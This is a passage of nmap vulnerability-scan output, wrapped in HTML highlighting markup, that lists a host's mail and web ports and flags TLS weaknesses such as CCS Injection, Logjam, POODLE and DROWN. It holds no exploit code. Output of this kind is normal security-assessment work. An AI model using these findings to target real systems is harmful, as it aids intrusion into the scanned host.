class="line">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">110/tcp  open  pop3       Dovecot pop3d</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-ccs-injection: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: High</span><br><span class="line">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="line">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="line">|       <span class="built_in">which</span> allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="line">|       length master key <span class="keyword">in</span> certain OpenSSL-to-OpenSSL communications, and</span><br><span class="line">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="line">|       a crafted TLS handshake, aka the <span class="string">&quot;CCS Injection&quot;</span> vulnerability.</span><br><span class="line">|           </span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="line">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="line">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       <span class="built_in">which</span> could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="line">|   </span><br><span class="line">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2015-4000  BID:74733</span><br><span class="line">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="line">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="line">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="line">|       to downgrade the security of a TLS session to 512-bit <span class="built_in">export</span>-grade</span><br><span class="line">|       cryptography, <span class="built_in">which</span> is significantly weaker, allowing the attacker</span><br><span class="line">|       to more easily <span class="built_in">break</span> the encryption and monitor or tamper with</span><br><span class="line">|       the encrypted stream.</span><br><span class="line">|     Disclosure date: 2015-5-19</span><br><span class="line">|     Check results:</span><br><span class="line">|       EXPORT-GRADE DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://weakdh.org</span><br><span class="line">|       https://www.securityfocus.com/bid/74733</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="line">|   </span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_      https://www.securityfocus.com/bid/70574</span><br><span class="line">| sslv2-drown: </span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|   vulns: </span><br><span class="line">|     CVE-2016-0800: </span><br><span class="line">|       title: OpenSSL: Cross-protocol attack on TLS using SSLv2 (DROWN)</span><br><span class="line">|       state: VULNERABLE</span><br><span class="line">|       ids: </span><br><span class="line">|         CVE:CVE-2016-0800</span><br><span class="line">|       description: </span><br><span class="line">|               The SSLv2 protocol, as used <span class="keyword">in</span> OpenSSL before 1.0.1s and 1.0.2 before 1.0.2g and</span><br><span class="line">|       other products, requires a server to send a ServerVerify message before establishing</span><br><span class="line">|       that a client possesses certain plaintext RSA data, <span class="built_in">which</span> makes it easier <span class="keyword">for</span> remote</span><br><span class="line">|       attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding</span><br><span class="line">|       oracle, aka a <span class="string">&quot;DROWN&quot;</span> attack.</span><br><span class="line">|     </span><br><span class="line">|       refs: </span><br><span class="line">|         https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800</span><br><span class="line">|_        https://www.openssl.org/news/secadv/20160301.txt</span><br><span class="line">111/tcp  open  rpcbind    2 (RPC <span class="comment">#100000)</span></span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">143/tcp  open  imap       Dovecot imapd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-ccs-injection: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: High</span><br><span class="line">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="line">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="line">|       <span class="built_in">which</span> allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="line">|       length master key <span class="keyword">in</span> certain OpenSSL-to-OpenSSL communications, and</span><br><span class="line">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="line">|       a crafted TLS handshake, aka the <span class="string">&quot;CCS Injection&quot;</span> vulnerability.</span><br><span class="line">|           </span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="line">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="line">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       <span class="built_in">which</span> could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="line">|   </span><br><span class="line">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2015-4000  BID:74733</span><br><span class="line">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="line">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="line">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="line">|       to downgrade the security of a TLS session to 512-bit <span class="built_in">export</span>-grade</span><br><span class="line">|       cryptography, <span class="built_in">which</span> is significantly weaker, allowing the attacker</span><br><span class="line">|       to more easily <span class="built_in">break</span> the encryption and monitor or tamper with</span><br><span class="line">|       the encrypted stream.</span><br><span class="line">|     Disclosure date: 2015-5-19</span><br><span class="line">|     Check results:</span><br><span class="line">|       EXPORT-GRADE DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://weakdh.org</span><br><span class="line">|       https://www.securityfocus.com/bid/74733</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="line">|   </span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_      https://www.securityfocus.com/bid/70574</span><br><span class="line">|_sslv2-drown: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">443/tcp  open  ssl/https?</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| ssl-ccs-injection: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL/TLS MITM vulnerability (CCS Injection)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     Risk factor: High</span></span><br><span class="line"><span class="string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span></span><br><span class="line"><span class="string">|       does not properly restrict processing of ChangeCipherSpec messages,</span></span><br><span class="line"><span class="string">|       which allows man-in-the-middle attackers to trigger use of a zero</span></span><br><span class="line"><span class="string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span></span><br><span class="line"><span class="string">|       consequently hijack sessions or obtain sensitive information, via</span></span><br><span class="line"><span class="string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span></span><br><span class="line"><span class="string">|       http://www.openssl.org/news/secadv_20140605.txt</span></span><br><span class="line"><span class="string">|_      http://www.cvedetails.com/cve/2014-0224</span></span><br><span class="line"><span class="string">| ssl-dh-params: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span></span><br><span class="line"><span class="string">|       of insufficient strength, especially those using one of a few commonly</span></span><br><span class="line"><span class="string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       WEAK DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus</span></span><br><span class="line"><span class="string">|             Modulus Length: 1024</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 1024</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|_      https://weakdh.org</span></span><br><span class="line"><span class="string">| ssl-poodle: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL POODLE information leak</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span></span><br><span class="line"><span class="string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span></span><br><span class="line"><span class="string">|           products, uses nondeterministic CBC padding, which makes it easier</span></span><br><span class="line"><span class="string">|           for man-in-the-middle attackers to obtain cleartext data via a</span></span><br><span class="line"><span class="string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2014-10-14</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span></span><br><span class="line"><span class="string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span></span><br><span class="line"><span class="string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span></span><br><span class="line"><span class="string">|_      https://www.securityfocus.com/bid/70574</span></span><br><span class="line"><span class="string">|_sslv2-drown: </span></span><br><span class="line"><span class="string">993/tcp  open  ssl/imaps?</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| ssl-ccs-injection: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL/TLS MITM vulnerability (CCS Injection)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     Risk factor: High</span></span><br><span class="line"><span class="string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span></span><br><span class="line"><span class="string">|       does not properly restrict processing of ChangeCipherSpec messages,</span></span><br><span class="line"><span class="string">|       which allows man-in-the-middle attackers to trigger use of a zero</span></span><br><span class="line"><span class="string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span></span><br><span class="line"><span class="string">|       consequently hijack sessions or obtain sensitive information, via</span></span><br><span class="line"><span class="string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span></span><br><span class="line"><span class="string">|       http://www.openssl.org/news/secadv_20140605.txt</span></span><br><span class="line"><span class="string">|_      http://www.cvedetails.com/cve/2014-0224</span></span><br><span class="line"><span class="string">| ssl-dh-params: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       Transport Layer Security (TLS) services that use anonymous</span></span><br><span class="line"><span class="string">|       Diffie-Hellman key exchange only provide protection against passive</span></span><br><span class="line"><span class="string">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span></span><br><span class="line"><span class="string">|       which could completely compromise the confidentiality and integrity</span></span><br><span class="line"><span class="string">|       of any data exchanged over the resulting session.</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       ANONYMOUS DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 512</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 512</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://www.ietf.org/rfc/rfc2246.txt</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2015-4000  BID:74733</span></span><br><span class="line"><span class="string">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span></span><br><span class="line"><span class="string">|       triggered when handling Diffie-Hellman key exchanges defined with</span></span><br><span class="line"><span class="string">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span></span><br><span class="line"><span class="string">|       to downgrade the security of a TLS session to 512-bit export-grade</span></span><br><span class="line"><span class="string">|       cryptography, which is significantly weaker, allowing the attacker</span></span><br><span class="line"><span class="string">|       to more easily break the encryption and monitor or tamper with</span></span><br><span class="line"><span class="string">|       the encrypted stream.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2015-5-19</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       EXPORT-GRADE DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 512</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 512</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://weakdh.org</span></span><br><span class="line"><span class="string">|       https://www.securityfocus.com/bid/74733</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span></span><br><span class="line"><span class="string">|       of insufficient strength, especially those using one of a few commonly</span></span><br><span class="line"><span class="string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       WEAK DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 1024</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 1024</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|_      https://weakdh.org</span></span><br><span class="line"><span class="string">| ssl-poodle: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL POODLE information leak</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span></span><br><span class="line"><span class="string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span></span><br><span class="line"><span class="string">|           products, uses nondeterministic CBC padding, which makes it easier</span></span><br><span class="line"><span class="string">|           for man-in-the-middle attackers to obtain cleartext data via a</span></span><br><span class="line"><span class="string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2014-10-14</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span></span><br><span class="line"><span class="string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span></span><br><span class="line"><span class="string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span></span><br><span class="line"><span class="string">|_      https://www.securityfocus.com/bid/70574</span></span><br><span class="line"><span class="string">| sslv2-drown: </span></span><br><span class="line"><span class="string">|   ciphers: </span></span><br><span class="line"><span class="string">|     SSL2_RC2_128_CBC_WITH_MD5</span></span><br><span class="line"><span class="string">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span></span><br><span class="line"><span class="string">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span></span><br><span class="line"><span class="string">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span></span><br><span class="line"><span class="string">|     SSL2_RC4_128_WITH_MD5</span></span><br><span class="line"><span class="string">|   vulns: </span></span><br><span class="line"><span class="string">|     CVE-2016-0800: </span></span><br><span class="line"><span class="string">|       title: OpenSSL: Cross-protocol attack on TLS using SSLv2 (DROWN)</span></span><br><span class="line"><span class="string">|       state: VULNERABLE</span></span><br><span class="line"><span class="string">|       ids: </span></span><br><span class="line"><span class="string">|         CVE:CVE-2016-0800</span></span><br><span class="line"><span class="string">|       description: </span></span><br><span class="line"><span class="string">|               The SSLv2 protocol, as used in OpenSSL before 1.0.1s and 1.0.2 before 1.0.2g and</span></span><br><span class="line"><span class="string">|       other products, requires a server to send a ServerVerify message before establishing</span></span><br><span class="line"><span class="string">|       that a client possesses certain plaintext RSA data, which makes it easier for remote</span></span><br><span class="line"><span class="string">|       attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding</span></span><br><span class="line"><span class="string">|       oracle, aka a &quot;DROWN&quot; attack.</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|       refs: </span></span><br><span class="line"><span class="string">|         https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800</span></span><br><span class="line"><span class="string">|_        https://www.openssl.org/news/secadv/20160301.txt</span></span><br><span class="line"><span class="string">995/tcp  open  ssl/pop3s?</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| ssl-ccs-injection: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL/TLS MITM vulnerability (CCS Injection)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     Risk factor: High</span></span><br><span class="line"><span class="string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span></span><br><span class="line"><span class="string">|       does not properly restrict processing of ChangeCipherSpec messages,</span></span><br><span class="line"><span class="string">|       which allows man-in-the-middle attackers to trigger use of a zero</span></span><br><span class="line"><span class="string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span></span><br><span class="line"><span class="string">|       consequently hijack sessions or obtain sensitive information, via</span></span><br><span class="line"><span class="string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span></span><br><span class="line"><span class="string">|       http://www.openssl.org/news/secadv_20140605.txt</span></span><br><span class="line"><span class="string">|_      http://www.cvedetails.com/cve/2014-0224</span></span><br><span class="line"><span class="string">| ssl-dh-params: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       Transport Layer Security (TLS) services that use anonymous</span></span><br><span class="line"><span class="string">|       Diffie-Hellman key exchange only provide protection against passive</span></span><br><span class="line"><span class="string">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span></span><br><span class="line"><span class="string">|       which could completely compromise the confidentiality and integrity</span></span><br><span class="line"><span class="string">|       of any data exchanged over the resulting session.</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       ANONYMOUS DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 512</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 512</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://www.ietf.org/rfc/rfc2246.txt</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2015-4000  BID:74733</span></span><br><span class="line"><span class="string">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span></span><br><span class="line"><span class="string">|       triggered when handling Diffie-Hellman key exchanges defined with</span></span><br><span class="line"><span class="string">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span></span><br><span class="line"><span class="string">|       to downgrade the security of a TLS session to 512-bit export-grade</span></span><br><span class="line"><span class="string">|       cryptography, which is significantly weaker, allowing the 